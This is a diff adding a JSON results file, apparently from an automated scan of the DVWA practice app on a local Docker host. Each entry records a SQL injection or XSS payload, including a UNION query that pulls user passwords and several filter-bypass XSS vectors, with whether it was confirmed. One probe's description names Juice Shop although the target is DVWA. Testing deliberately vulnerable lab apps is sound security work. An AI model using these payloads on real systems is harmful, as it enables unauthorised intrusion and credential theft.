@@ -1,0 +1,156 @@
+[
+  {
+    "payload": "1' OR '1'='1",
+    "technique": "basic_quote_breakout",
+    "description": "Classic quote-breakout, confirms basic injection point",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1 OR 1=1",
+    "technique": "quote_free_bypass",
+    "description": "No-quote variant - bypasses naive quote-escaping filters",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' UNION SELECT user, password FROM users #",
+    "technique": "union_data_exfiltration",
+    "description": "UNION-based extraction - confirms actual data exfiltration impact",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' AND '1'='2",
+    "technique": "logical_control_check",
+    "description": "False-condition control test - confirms DB evaluates injected logic (expected to show FEWER results, not more)",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "'(",
+    "technique": "error_trigger_probe",
+    "description": "Minimal quote+paren probe - confirmed to trigger a server error on Juice Shop's search endpoint in baseline scan",
+    "confirmed": true,
+    "evidence": "new_sql_error_signature: sql syntax",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' OR '1'='1",
+    "technique": "basic_quote_breakout",
+    "description": "Classic quote-breakout, confirms basic injection point",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli_blind/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1 OR 1=1",
+    "technique": "quote_free_bypass",
+    "description": "No-quote variant - bypasses naive quote-escaping filters",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli_blind/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' UNION SELECT user, password FROM users #",
+    "technique": "union_data_exfiltration",
+    "description": "UNION-based extraction - confirms actual data exfiltration impact",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli_blind/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "1' AND '1'='2",
+    "technique": "logical_control_check",
+    "description": "False-condition control test - confirms DB evaluates injected logic (expected to show FEWER results, not more)",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli_blind/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "'(",
+    "technique": "error_trigger_probe",
+    "description": "Minimal quote+paren probe - confirmed to trigger a server error on Juice Shop's search endpoint in baseline scan",
+    "confirmed": false,
+    "evidence": "no_anomaly_detected",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/sqli_blind/",
+    "param": "id",
+    "vuln_type": "sqli"
+  },
+  {
+    "payload": "<script>alert('XSS')</script>",
+    "technique": "basic_script_tag",
+    "description": "Classic script tag injection",
+    "confirmed": true,
+    "evidence": "payload_reflected_unescaped",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/xss_r/",
+    "param": "name",
+    "vuln_type": "xss"
+  },
+  {
+    "payload": "<scr<script>ipt>alert('XSS')</scr<script>ipt>",
+    "technique": "nested_tag_bypass",
+    "description": "Nested-tag bypass - defeats single-pass non-recursive filters",
+    "confirmed": true,
+    "evidence": "payload_reflected_unescaped",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/xss_r/",
+    "param": "name",
+    "vuln_type": "xss"
+  },
+  {
+    "payload": "<img src=x onerror=alert('XSS')>",
+    "technique": "event_handler_bypass",
+    "description": "Non-script-tag vector via image error handler",
+    "confirmed": true,
+    "evidence": "payload_reflected_unescaped",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/xss_r/",
+    "param": "name",
+    "vuln_type": "xss"
+  },
+  {
+    "payload": "<iframe src=\"javascript:alert('XSS')\">",
+    "technique": "iframe_javascript_uri",
+    "description": "Alternate vector using iframe javascript: URI",
+    "confirmed": true,
+    "evidence": "payload_reflected_unescaped",
+    "target": "dvwa",
+    "url": "http://host.docker.internal:8080/vulnerabilities/xss_r/",
+    "param": "name",
+    "vuln_type": "xss"
+  }
+]
